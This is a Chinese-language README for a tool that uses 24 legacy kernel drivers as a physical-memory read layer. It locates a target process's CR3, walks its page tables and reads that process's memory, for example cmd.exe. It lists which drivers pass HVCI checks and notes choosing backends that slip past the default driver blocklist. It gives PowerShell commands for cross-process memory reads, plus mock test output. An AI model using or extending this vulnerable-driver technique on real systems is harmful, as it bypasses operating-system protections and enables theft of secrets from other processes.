# 24 个 legacy backend 接入「CR3 定位 + 页表翻译 + 物理取数」

目标：不重写 24 个 legacy 驱动协议，先让 **`membridge.exe` 的 24 个 backend 统一充当取数层**，再配合 `layers.exe` 的定位层/翻译层读取任意进程（如 cmd.exe）的用户 VA。

## 1. 架构

```
                  ┌──────────────────────────────────────────┐
cmd.exe PID ─────►│ 定位层: KPRL(0x239584) / KKYUM / Invary  │──► CR3
                  │ 或物理扫描 EPROCESS (需要取数层)          │
                  └──────────────────────────────────────────┘
                                      │ CR3
                                      ▼
                  ┌──────────────────────────────────────────┐
cmd.exe VA ──────►│ 翻译层: 4-level / 5-level page walk       │──► PA
                  │ 每次读页表项都通过取数层读取 8 字节       │
                  └──────────────────────────────────────────┘
                                      │ PA
                                      ▼
                  ┌──────────────────────────────────────────┐
                  │ 取数层: legacy bridge                     │
                  │ layers --reader legacy --legacy-backend X │
                  │   → spawn membridge.exe --backend X       │
                  │     --pa PA --size N --out-file temp      │
                  │   → 读回 temp 字节                        │
                  └──────────────────────────────────────────┘
```

`layers.exe --reader legacy` 是一个**元 provider**：它本身不打开设备，而是把每次物理读转发给 `membridge.exe --backend <id>`。因此 24 个 legacy backend 立刻具备三层能力，无需把 24 套协议移植到 `layers.c`。

**读取分块**：`membridge.exe --size` 上限是 `0x10000`，而物理扫描 locator 每次读 1MB；bridge 自动把大读拆成 64KB 块，保证定位层的 1MB 扫描也能走 legacy backend。

## 2. 24 个 backend

`layers.exe --list-legacy` 打印全部 24 个 backend、驱动路径和 HVCI 审计：

- `cchwapi_2_9` / `cchwapi_2_12` / `cchwapi_ext_4_5` / `hp_swtools` / `swtoolsdriver` / `hp_swtools_v1` / `isharepp` / `gibepext` / `gibepext2` / `tdeio` / `mrt` / `ufu_win10` / `winring0x64`：HVCI PASS 子集；
- 其余为 FAIL/WARN（详见 `docs/drivers_inventory.md` 与 `evidence/hvci_driver_report.json`）；
- `ufu_win10` 仅 32-bit PA；`winring0x64` 仅低内存。

## 3. 用法

### 3.0 20 个 provider 自动物理扫描 CR3
```powershell
.\bin\layers.exe --locate --scan-providers --pid <cmd_pid> --name cmd.exe --auto-ranges
# 带每个 provider 的 open/scan 计时
.\bin\layers.exe --locate --scan-bench --pid <cmd_pid> --name cmd.exe --scan-start 0x100000 --scan-size 0x100000
# 离线自测 provider 扫描逻辑（内置 mock，不需要驱动）
.\bin\layers.exe --locate --scan-providers --scan-mock --scan-bench --pid 4242 --name MOCK.exe --scan-start 0x8000 --scan-size 0x1000 --va 0x400000 --size 8 --dump
```
管理员封装脚本：`scripts/bench_provider_scan.ps1`。

### 3.1 物理读（取数层单独验证）
```powershell
.\bin\layers.exe --reader legacy --legacy-backend cchwapi_2_12 `
    --read-phys --pa 0x10000000 --size 0x40 --dump
```

### 3.2 CR3 + 页表翻译 + 取数（读 cmd.exe VA）
```powershell
# 1) 通过 KPRL/KKYUM/Invary 定位 cmd.exe 的 CR3（不需要 legacy 取数层）
.\bin\layers.exe --locate --kprl --pid <cmd_pid>
# 或 .\bin\layers.exe --locate --kkyum --pid <cmd_pid>
# 或 .\bin\layers.exe --locate --invary --pid <cmd_pid>

# 2) 用某个 legacy backend 做物理取数，翻译并读取
.\bin\layers.exe --reader legacy --legacy-backend cchwapi_2_12 `
    --cr3 <CR3> --va <cmd_va> --size 0x40 --dump

# 3) 也可用 physical scan 定位（这时取数层用 legacy backend）
.\bin\layers.exe --reader legacy --legacy-backend cchwapi_2_12 `
    --locate --pid <cmd_pid> --auto-ranges
```

### 3.3 常用选项
- `--legacy-bin <path>`：指定 `membridge.exe`（默认同目录 `membridge.exe`）；
- `--legacy-no-load`：不给子进程传 `--no-load` 时不加该参数；驱动已加载时建议加，避免每次尝试加载；
- `MB_LEGACY_DEBUG=1`：输出子进程命令/退出码，便于调试。

## 4. 验证（离线，不需要真实驱动）

仓库自带可复现测试：
```powershell
pwsh -File scripts\test_legacy_pipeline.ps1
```
`test/fake_legacy_mem.c` 构造一个合成物理内存（EPROCESS + 4 级页表 + 数据），测试：

1. `--reader legacy --cr3 0x200000 --va 0x400000 --size 8` → `PA=0x300000`、`4C 45 47 41...`、PASS；
2. `--reader legacy --locate --pid 4242 --name cmd.exe --scan-start 0x100000 --scan-size 0x100000 --va 0x400000 --size 8` → **定位层扫描到 EPROCESS_PA=0x100000、CR3=0x200000**，翻译+取数 PASS；
3. 1MB 扫描分块测试（bridge 把 1MB 拆成 64KB 块），PASS；
4. `--locate --scan-providers --scan-mock`：provider-scan 路径用内置 mock 定位 CR3=0x1000 并读取数据，PASS。

实测输出：
```
[OK] 定位层 scan: PID=4242 EPROCESS_PA=0x100000 CR3=0x200000
[OK] 翻译+取数 VA=0x400000 -> 8 bytes
4C 45 47 41 43 59 2D 43
VERDICT=PASS
LEGACY_PIPELINE_TEST=PASS
```
证明 **24 legacy backend → 定位层（物理扫描）→ 翻译层 → 取数层** 的完整链路已打通；真实驱动加载/读取仍需管理员环境。

`layers.exe --selftest-mock`：**46/46 PASS**（新增 legacy registry 检查）。

## 5. 限制与下一步
- **性能**：当前是每个物理读一次子进程，读 4KB 页约需一次进程启动；适合验证，不适合大批量扫描。下一步可以在 `membridge.exe` 增加长连接/批量输出，或把 24 套协议移植为 in-process provider。
- **管理员**：真实读取仍需要管理员加载驱动；HVCI 下仅 PASS backend 可加载。
- **blocklist**：HVCI 机器的 blocklist 默认策略可能拦截已知 BYOD hash，需按 `--list-legacy` 的 PASS/实际加载结果选择。
- **下一步**：为 `membridge.exe` 增加持久 server 模式（一次打开设备、多次读）以减少进程启动开销；再实现 `legacy` provider 的持久连接。
